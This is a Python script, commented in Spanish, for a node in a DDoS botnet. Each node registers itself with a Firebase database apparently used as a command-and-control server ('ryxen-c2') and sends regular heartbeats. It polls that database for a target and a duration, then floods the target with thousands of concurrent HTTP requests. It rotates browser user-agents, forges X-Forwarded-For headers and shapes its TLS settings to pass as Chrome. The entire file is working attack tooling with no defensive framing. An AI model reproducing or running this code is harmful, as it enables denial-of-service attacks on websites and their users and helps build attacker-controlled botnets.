import asyncio
import aiohttp
import time
import random
import ssl
import json
import socket

# Configuración de Firebase
DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

async def get_node_info():
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get('http://ip-api.com/json/', timeout=5) as r:
                data = await r.json()
                return data.get('query', '0.0.0.0'), data.get('countryCode', 'UN')
    except: return "0.0.0.0", "?? "

async def report_status(nid, ip, cc):
    async with aiohttp.ClientSession() as s:
        while True:
            try:
                await s.put(f"{NODES_URL}/{nid}.json", 
                           json={"id": nid, "ip": ip, "country": cc, "t": time.time()})
            except: pass
            await asyncio.sleep(15)

async def flood(target, end_time, semaphore):
    # TLS Handshake optimizado (imita Chrome 120)
    ctx = ssl.create_default_context()
    ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384')
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET, keepalive_timeout=60)
    
    async with aiohttp.ClientSession(connector=conn) as session:
        while time.time() < end_time:
            async with semaphore: # Controla que no se cuelgue el script
                try:
                    headers = {
                        'User-Agent': random.choice([
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
                        ]),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'X-Forwarded-For': f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive'
                    }
                    async with session.get(target, headers=headers, timeout=2, allow_redirects=False) as r:
                        await r.release()
                except:
                    await asyncio.sleep(0.001)

async def main():
    ip, cc = await get_node_info()
    nid = f"RX-{cc}-{random.randint(100, 999)}"
    print(f"[*] Nodo {nid} [{ip}] listo para el despliegue.")
    
    asyncio.create_task(report_status(nid, ip, cc))
    
    last_s = ""
    # Semáforo para manejar 3000 conexiones concurrentes por nodo sin colapsar la RAM
    sem = asyncio.Semaphore(3000) 
    
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(DB_URL) as r:
                    data = await r.json()
                if data and data.get('stamp') != last_s:
                    last_s = data['stamp']
                    target = data['target'] if data['target'].startswith("http") else f"http://{data['target']}"
                    duration = int(data['time'])
                    if duration == 0: continue

                    print(f"[!] LANZANDO FUEGO -> {target} ({duration}s)")
                    # Repartimos la carga en múltiples tareas de inundación
                    tasks = [flood(target, time.time() + duration, sem) for _ in range(10)]
                    await asyncio.gather(*tasks)
            except: pass
            await asyncio.sleep(2)

if __name__ == "__main__":
    asyncio.run(main())
    
